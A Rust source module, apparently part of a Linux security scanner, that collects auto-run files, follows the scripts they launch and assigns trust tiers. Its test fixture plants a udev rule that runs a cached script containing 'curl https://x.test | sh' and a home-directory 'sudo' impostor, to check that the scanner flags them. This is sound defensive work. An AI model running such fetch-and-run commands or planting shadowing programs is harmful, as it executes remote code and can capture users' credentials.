//! Collecting what runs on its own: every file in the auto-run catalog (the
//! system's, and the user's under their home), what links there point at,
//! and the programs and scripts the collected files run, each with its
//! trust tier and content.

use std::collections::{BTreeMap, HashSet};
use std::fs;
use std::io;
use std::path::Path;

use super::commands;
use super::index::PackageIndex;
use super::read::{self, Found};
use super::tier::{Observed, Tier, classify};
use crate::autorun::{Category, Kind, Location, SYSTEM, SYSTEM_SWEEP, USER};
use crate::content::{self, Content};
use crate::rules::RuleId;
use crate::scan::MAX_TEXT_FILE_SIZE;
use crate::sha256::Digest;

/// Command names a program in the home directory should never take over.
const WATCHED_NAMES: &[&str] = &[
    "sudo",
    "su",
    "doas",
    "run0",
    "pacman",
    "yay",
    "paru",
    "makepkg",
    "ssh",
    "scp",
    "git",
    "gpg",
    "passwd",
    "bash",
    "sh",
    "zsh",
    "systemctl",
    "omarchy-guardian",
];

/// Where Omarchy's installer lives; paths it mentions are noted as "likely
/// Omarchy" when no package owns them.
const OMARCHY_INSTALL: &[&str] = &["usr/share/omarchy/install", "usr/share/omarchy/migrations"];

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Origin {
    /// The system, read as the user.
    System,
    /// The user's home directory.
    User,
    /// The system and root's home, read by the root collector.
    Root,
}

/// What an item holds, as far as the review is concerned.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Body {
    Text(String),
    /// A recognised binary format: hashed, never read.
    Binary(&'static str),
    /// Binary data where text belongs; cannot be reviewed.
    Undecodable,
    /// Text larger than the review limit.
    Oversized,
    /// A link; its target is its own item when it needs judging.
    Link(String),
    /// Could not be read as this user.
    Unreadable(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Item {
    pub origin: Origin,
    pub category: Category,
    /// Relative to the root (`etc/udev/rules.d/x.rules`, `home/u/.bashrc`).
    pub path: String,
    pub tier: Tier,
    pub sha256: Option<Digest>,
    pub body: Body,
    /// The command lines it runs.
    pub runs: Vec<String>,
    /// The item that runs or links to this one.
    pub run_by: Option<String>,
    pub notes: Vec<String>,
    /// What the live checks established about it (a rule and what was seen).
    pub alerts: Vec<(RuleId, String)>,
}

impl Item {
    /// Trusted items are only counted. An item the live checks raised an
    /// alert about is not trusted by its tier (a setuid copy of a packaged
    /// program is still a copy), only by the user allowing it.
    pub fn is_trusted(&self) -> bool {
        self.tier == Tier::Allowed
            || (super::judge::is_trusted(self.tier) && self.alerts.is_empty())
    }
}

#[derive(Debug, Default)]
pub struct Collection {
    pub items: Vec<Item>,
    /// Locations with more entries than were looked at.
    pub truncated: Vec<String>,
}

/// What a collection runs against.
pub struct Scope<'a> {
    pub root: &'a Path,
    /// The home directory relative to the root (`home/u`), if any.
    pub home: Option<&'a str>,
    pub index: &'a PackageIndex,
    pub origin: Origin,
}

/// Collects the system catalog and, with a home, the user catalog.
pub fn collect(scope: &Scope<'_>) -> Collection {
    let mut paths: BTreeMap<String, Category> = BTreeMap::new();
    let mut collection = Collection::default();
    for location in SYSTEM.iter().chain(SYSTEM_SWEEP) {
        add_location(scope, location, "", &mut paths, &mut collection.truncated);
    }
    if let Some(home) = scope.home {
        for location in USER {
            add_location(
                scope,
                location,
                &format!("{home}/"),
                &mut paths,
                &mut collection.truncated,
            );
        }
    }

    let mut seen: HashSet<String> = paths.keys().cloned().collect();
    let mut pending: Vec<Item> = paths
        .into_iter()
        .map(|(path, category)| item(scope, category, path, None))
        .collect();
    let omarchy = omarchy_paths(scope.root);
    while let Some(mut item) = pending.pop() {
        for target in follow(scope, &item) {
            if seen.insert(target.clone()) {
                pending.push(self::item(scope, item.category, target, Some(&item.path)));
            }
        }
        if item.tier == Tier::Unknown && omarchy.contains(&format!("/{}", item.path)) {
            item.notes.push("a path Omarchy's installer writes".into());
        }
        collection.items.push(item);
    }
    collection
        .items
        .sort_by(|left, right| left.path.cmp(&right.path));
    collection
}

/// Adds `items` to `collection`; an item already there by path gains the
/// new one's notes and alerts instead of appearing twice.
pub fn merge(collection: &mut Collection, items: Vec<Item>) {
    for item in items {
        if let Some(existing) = collection
            .items
            .iter_mut()
            .find(|existing| existing.path == item.path)
        {
            for note in item.notes {
                if !existing.notes.contains(&note) {
                    existing.notes.push(note);
                }
            }
            for alert in item.alerts {
                if !existing.alerts.contains(&alert) {
                    existing.alerts.push(alert);
                }
            }
        } else {
            collection.items.push(item);
        }
    }
    collection
        .items
        .sort_by(|left, right| left.path.cmp(&right.path));
}

/// Adds the files of `location` (under `prefix`, the home for user
/// locations) that run on their own.
fn add_location(
    scope: &Scope<'_>,
    location: &Location,
    prefix: &str,
    paths: &mut BTreeMap<String, Category>,
    truncated: &mut Vec<String>,
) {
    let base = format!("{prefix}{}", location.path);
    let candidates = if location.kind == Kind::File {
        // A file behind a directory only root can list is still looked at,
        // and reported as unreadable.
        match fs::symlink_metadata(scope.root.join(&base)) {
            Err(error) if error.kind() == io::ErrorKind::NotFound => return,
            Ok(_) | Err(_) => vec![base],
        }
    } else {
        let listing = read::entries(scope.root, &base);
        if listing.truncated {
            truncated.push(format!("/{base}"));
        }
        // A directory only root can list is one unreadable item.
        for directory in listing.unreadable {
            paths.entry(directory).or_insert(location.category);
        }
        listing.files
    };
    for path in candidates {
        let relative = path.strip_prefix(prefix).unwrap_or(&path);
        if location.contains(relative) && wanted(scope, location.category, relative) {
            paths.entry(path).or_insert(location.category);
        }
    }
}

/// Whether a file in a user location is one that runs on its own.
fn wanted(scope: &Scope<'_>, category: Category, relative: &str) -> bool {
    let name = relative.rsplit('/').next().unwrap_or(relative);
    match category {
        Category::Hyprland => {
            (read::has_extension(name, "lua") || read::has_extension(name, "conf"))
                && !name.contains(".bak")
        }
        // Omarchy runs every hook but `*.sample`.
        Category::OmarchyHook => !name.ends_with(".sample"),
        // Old password hashes (`pam_pwhistory`): never read, never handed on.
        Category::Pam => name != "opasswd",
        Category::Autostart if relative.starts_with(".config/autostart/") => {
            name.ends_with(".desktop")
        }
        // Only launchers that replace a system app's.
        Category::Desktop => {
            name.ends_with(".desktop")
                && scope
                    .root
                    .join("usr/share/applications")
                    .join(name)
                    .exists()
        }
        // Only programs named like a system command.
        Category::LocalBin => {
            WATCHED_NAMES.contains(&name)
                || name.starts_with("omarchy-")
                || scope.root.join("usr/bin").join(name).exists()
        }
        _ => true,
    }
}

/// One item: what is at `path`, its tier and content, and what it runs.
pub fn item(scope: &Scope<'_>, category: Category, path: String, run_by: Option<&str>) -> Item {
    let found = read::look(scope.root, &path);
    let (tier, sha256, body) = match &found {
        Found::File {
            sha256,
            mode,
            size,
            head,
        } => {
            let observed = Observed::File {
                sha256,
                mode: *mode,
                size: *size,
            };
            (
                classify(&path, observed, scope.index),
                Some(*sha256),
                body_of(&path, *size, head),
            )
        }
        Found::Link(target) => {
            let resolved_path = read::resolve(scope.root, &path, target);
            let resolved = resolved_path
                .as_deref()
                .and_then(|resolved| self_tier(scope, resolved));
            let name = path.rsplit('/').next().unwrap_or(&path);
            let observed = Observed::Link {
                target,
                resolved,
                alias: resolved_path
                    .as_deref()
                    .is_some_and(|resolved| declares_alias(scope.root, resolved, name)),
            };
            (
                classify(&path, observed, scope.index),
                None,
                Body::Link(target.clone()),
            )
        }
        Found::Other => {
            let directory = fs::symlink_metadata(scope.root.join(&path))
                .is_ok_and(|metadata| metadata.is_dir());
            let reason = if directory {
                "a directory only root can list"
            } else {
                "not a regular file"
            };
            (Tier::Unknown, None, Body::Unreadable(reason.into()))
        }
        Found::Unreadable(reason) => (Tier::Unknown, None, Body::Unreadable(reason.clone())),
    };
    let runs = match &body {
        Body::Text(text) => commands::commands(category, &path, text),
        _ => Vec::new(),
    };
    let notes = notes(scope, category, &path, &body, run_by);
    Item {
        // The root collector's items are all root's, its home included.
        origin: if scope.origin == Origin::System
            && scope
                .home
                .is_some_and(|home| path.starts_with(&format!("{home}/")))
        {
            Origin::User
        } else {
            scope.origin
        },
        category,
        path,
        tier,
        sha256,
        body,
        runs,
        run_by: run_by.map(str::to_string),
        notes,
        alerts: Vec::new(),
    }
}

/// What to tell about an item beyond its tier.
fn notes(
    scope: &Scope<'_>,
    category: Category,
    path: &str,
    body: &Body,
    run_by: Option<&str>,
) -> Vec<String> {
    let mut notes = Vec::new();
    if let Some(by) = run_by {
        notes.push(format!("run by /{by}"));
    }
    if let (Body::Unreadable(_), Some(owned)) = (body, scope.index.owner(path)) {
        notes.push(format!(
            "installed by {}; only root can read it",
            scope.index.package(owned)
        ));
    }
    if category == Category::LocalBin
        && let Some(name) = path.rsplit('/').next()
        && scope.root.join("usr/bin").join(name).exists()
    {
        notes.push(format!("shadows /usr/bin/{name}"));
    }
    if category == Category::Desktop
        && let Some(name) = path.rsplit('/').next()
        && scope
            .root
            .join("usr/share/applications")
            .join(name)
            .exists()
    {
        notes.push(format!(
            "replaces the launcher /usr/share/applications/{name}"
        ));
    }
    notes
}

/// Whether the unit at `unit` declares `name` as an alias (`Alias=` in its
/// `[Install]` section), as `systemctl enable` links it under.
fn declares_alias(root: &Path, unit: &str, name: &str) -> bool {
    let Found::File { head, size, .. } = read::look(root, unit) else {
        return false;
    };
    if size > 64 * 1024 {
        return false;
    }
    String::from_utf8_lossy(&head).lines().any(|line| {
        line.trim()
            .strip_prefix("Alias=")
            .is_some_and(|aliases| aliases.split_whitespace().any(|alias| alias == name))
    })
}

/// The tier of the regular file at `path`, if it is one.
fn self_tier(scope: &Scope<'_>, path: &str) -> Option<Tier> {
    match read::look(scope.root, path) {
        Found::File {
            sha256, mode, size, ..
        } => Some(classify(
            path,
            Observed::File {
                sha256: &sha256,
                mode,
                size,
            },
            scope.index,
        )),
        Found::Link(_) | Found::Other | Found::Unreadable(_) => None,
    }
}

fn body_of(path: &str, size: u64, head: &[u8]) -> Body {
    if size > MAX_TEXT_FILE_SIZE {
        return match content::classify_payload(path, &head[..head.len().min(8192)]) {
            Content::Binary(format) => Body::Binary(format.label()),
            Content::Text(_) | Content::Lossy { .. } => Body::Oversized,
            Content::Undecodable => Body::Undecodable,
        };
    }
    match content::classify_payload(path, head) {
        Content::Text(text) | Content::Lossy { text, .. } => Body::Text(text),
        Content::Binary(format) => Body::Binary(format.label()),
        Content::Undecodable => Body::Undecodable,
    }
}

/// The paths `item` leads to that need judging too: a link's target, and
/// the programs and scripts its commands run.
fn follow(scope: &Scope<'_>, item: &Item) -> Vec<String> {
    let mut targets = Vec::new();
    // Only a link to a regular file leads anywhere to judge (a masked
    // unit's `/dev/null` does not).
    if let Body::Link(target) = &item.body
        && let Some(resolved) = read::resolve(scope.root, &item.path, target)
        && fs::symlink_metadata(scope.root.join(&resolved)).is_ok_and(|metadata| metadata.is_file())
    {
        targets.push(resolved);
    }
    let home = scope.home.unwrap_or("root");
    for command in &item.runs {
        targets.extend(commands::targets(scope.root, home, command));
    }
    targets
        .into_iter()
        .filter_map(|target| read::canonical(scope.root, &target))
        .collect()
}

/// Absolute paths mentioned in Omarchy's installer scripts.
fn omarchy_paths(root: &Path) -> HashSet<String> {
    let mut paths = HashSet::new();
    for directory in OMARCHY_INSTALL {
        for file in read::entries(root, directory).files {
            let Ok(text) = fs::read_to_string(root.join(&file)) else {
                continue;
            };
            for word in text.split(|c: char| {
                c.is_whitespace() || matches!(c, '"' | '\'' | '>' | '<' | '(' | ')' | ';')
            }) {
                if word.starts_with('/') && word.len() > 1 {
                    paths.insert(word.trim_end_matches([',', '|']).to_string());
                }
            }
        }
    }
    paths
}

#[cfg(test)]
mod tests {
    use std::collections::HashSet;
    use std::fs;
    use std::os::unix::fs::symlink;
    use std::path::Path;

    use super::{Body, Origin, Scope, collect};
    use crate::autorun::Category;
    use crate::sha256::Sha256;
    use crate::sweep::index::PackageIndex;
    use crate::sweep::tier::Tier;
    use crate::test_support::TempDir;

    fn write(root: &Path, path: &str, text: &str) {
        fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
        fs::write(root.join(path), text).unwrap();
    }

    #[test]
    fn a_fixture_system_is_collected_with_tiers_and_what_runs() {
        let dir = TempDir::new("sweep-collect");
        let root = dir.path();
        let unit =
            "[Service]\nExecStart=/usr/bin/vendord\n[Install]\nAlias=display-manager.service\n";
        write(root, "usr/lib/systemd/system/vendord.service", unit);
        write(root, "usr/bin/vendord", "vendor binary");
        write(root, "usr/bin/bash", "bash");
        fs::create_dir_all(root.join("etc/systemd/system/multi-user.target.wants")).unwrap();
        symlink(
            "/usr/lib/systemd/system/vendord.service",
            root.join("etc/systemd/system/multi-user.target.wants/vendord.service"),
        )
        .unwrap();
        write(
            root,
            "etc/udev/rules.d/99-x.rules",
            "RUN+=\"/usr/bin/bash /home/u/.cache/x.sh\"\n",
        );
        write(root, "home/u/.cache/x.sh", "curl https://x.test | sh\n");
        write(
            root,
            "home/u/.config/omarchy/hooks/post-boot.d/a.sample",
            "x",
        );
        write(
            root,
            "home/u/.config/omarchy/hooks/post-boot.d/run",
            "echo hi\n",
        );
        write(
            root,
            "home/u/.config/hypr/autostart.lua",
            "o.exec_on_start(\"waybar\")\n",
        );
        write(root, "home/u/.config/hypr/autostart.lua.bak.1", "old");
        write(root, "home/u/.local/bin/sudo", "#!/bin/sh\n");
        write(root, "home/u/.local/bin/mytool", "#!/bin/sh\n");
        symlink("/dev/null", root.join("etc/systemd/system/masked.service")).unwrap();

        let digest = |text: &str| Sha256::digest(text.as_bytes());
        let mut index = PackageIndex::with_foreign(HashSet::new());
        index.add_for_test(
            "vendor",
            &format!(
                "#mtree\n/set type=file mode=644\n./usr/lib/systemd/system/vendord.service sha256digest={}\n./usr/bin/vendord mode=644 sha256digest={}\n./usr/bin/bash mode=644 sha256digest={}\n",
                digest(unit),
                digest("vendor binary"),
                digest("bash")
            ),
            &[],
        );
        let collection = collect(&Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        });
        let tiers: Vec<(&str, Tier)> = collection
            .items
            .iter()
            .map(|item| (item.path.as_str(), item.tier))
            .collect();
        assert_eq!(
            tiers,
            [
                ("etc/systemd/system/masked.service", Tier::Inert),
                (
                    "etc/systemd/system/multi-user.target.wants/vendord.service",
                    Tier::Vendor
                ),
                ("etc/udev/rules.d/99-x.rules", Tier::Unknown),
                ("home/u/.cache/x.sh", Tier::Unknown),
                ("home/u/.config/hypr/autostart.lua", Tier::Unknown),
                (
                    "home/u/.config/omarchy/hooks/post-boot.d/run",
                    Tier::Unknown
                ),
                ("home/u/.local/bin/sudo", Tier::Unknown),
                ("usr/bin/bash", Tier::Vendor),
                ("usr/bin/vendord", Tier::Vendor),
                ("usr/lib/systemd/system/vendord.service", Tier::Vendor),
            ]
        );
        let script = &collection.items[3];
        assert_eq!(
            script.run_by.as_deref(),
            Some("etc/udev/rules.d/99-x.rules")
        );
        assert_eq!(script.origin, Origin::User);
        assert_eq!(script.category, Category::Udev);
        assert!(matches!(&script.body, Body::Text(text) if text.contains("curl")));
        assert_eq!(collection.items[4].runs, ["waybar"]);
    }

    #[test]
    fn a_link_takes_its_units_trust_only_under_a_name_the_unit_declares() {
        let dir = TempDir::new("sweep-alias");
        let root = dir.path();
        let unit = "[Service]\nExecStart=/usr/bin/true\n[Install]\nAlias=display-manager.service\n";
        write(root, "usr/lib/systemd/system/sddm.service", unit);
        fs::create_dir_all(root.join("etc/systemd/system")).unwrap();
        for name in ["display-manager.service", "getty.service"] {
            symlink(
                "/usr/lib/systemd/system/sddm.service",
                root.join("etc/systemd/system").join(name),
            )
            .unwrap();
        }
        let mut index = PackageIndex::with_foreign(HashSet::new());
        index.add_for_test(
            "sddm",
            &format!(
                "#mtree\n./usr/lib/systemd/system/sddm.service type=file mode=644 sha256digest={}\n",
                Sha256::digest(unit.as_bytes())
            ),
            &[],
        );
        let collection = collect(&Scope {
            root,
            home: None,
            index: &index,
            origin: Origin::System,
        });
        let tier = |path: &str| {
            collection
                .items
                .iter()
                .find(|item| item.path == path)
                .map(|item| item.tier)
        };
        assert_eq!(
            tier("etc/systemd/system/display-manager.service"),
            Some(Tier::Vendor)
        );
        assert_eq!(
            tier("etc/systemd/system/getty.service"),
            Some(Tier::Unknown)
        );
    }
}
